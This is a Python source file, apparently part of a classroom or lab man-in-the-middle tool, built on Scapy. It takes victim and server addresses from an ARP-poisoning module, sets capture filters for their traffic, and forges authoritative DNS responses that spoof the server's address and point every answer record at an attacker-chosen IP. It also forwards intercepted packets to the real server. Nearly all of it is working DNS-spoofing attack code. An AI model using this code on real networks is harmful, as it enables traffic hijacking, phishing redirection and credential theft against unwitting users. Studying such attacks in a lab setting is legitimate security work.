from scapy.all import *
from scapy.layers.inet import TCP, IP, ICMP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.l2 import *
# import pcap
import help_functions
from log_helpers import *
from firewall import *
from arp_poison import client_ip, server_ip, local_ip, get_ip_from_url

custom_ip = get_ip_from_url()


def get_man_in_middle_filter():
    return "(dst host {}) and (src host {})".format(server_ip, client_ip)


def get_man_in_middle_answer_filter():
    return "(dst host {}) and (src host {})".format(client_ip, server_ip)


def spf_pkt(sniffed_dns_pkt):
    """get a DNS Request packet. Returns DNS Response packet directing to the custom ip."""
    sp_pkt = IP(src=server_ip, dst=sniffed_dns_pkt[IP].src) \
               / UDP(dport=sniffed_dns_pkt[UDP].sport, sport=53) \
               / DNS(id=sniffed_dns_pkt[DNS].id, qr=1, opcode=sniffed_dns_pkt[DNS].opcode,
                     aa=1, rd=0, qdcount=sniffed_dns_pkt[DNS].qdcount, ancount=1, nscount=1,
                     qd=DNSQR(qname=sniffed_dns_pkt[DNSQR].qname),
                     an=DNSRR(rrname=sniffed_dns_pkt[DNSQR].qname, ttl=86400, rdata=custom_ip),
                     ns=DNSRR(rrname=sniffed_dns_pkt[DNSQR].qname, type=2, rdata=custom_ip),
                     ar=DNSRR(rrname=sniffed_dns_pkt[DNSQR].qname, rdata=custom_ip))
    return sp_pkt


def send_custom_dns_response(sniffed_pkt):
    """send custom dns response back to the target"""
    sniffed_pkt.show()
    spf_resp = spf_pkt(sniffed_pkt)

    send(spf_resp, verbose=0)


def forward_pkt_to_server(sniffed_pkt):
    """pass pkt destined to server"""

    server_mac = getmacbyip(server_ip)
    sniffed_pkt[Ether].dst = server_mac
    if ARP in sniffed_pkt:
        sniffed_pkt[ARP].hwdst = server_mac
    print("pkt changed. Forwarding.")
    # pk.show()
    send(sniffed_pkt)
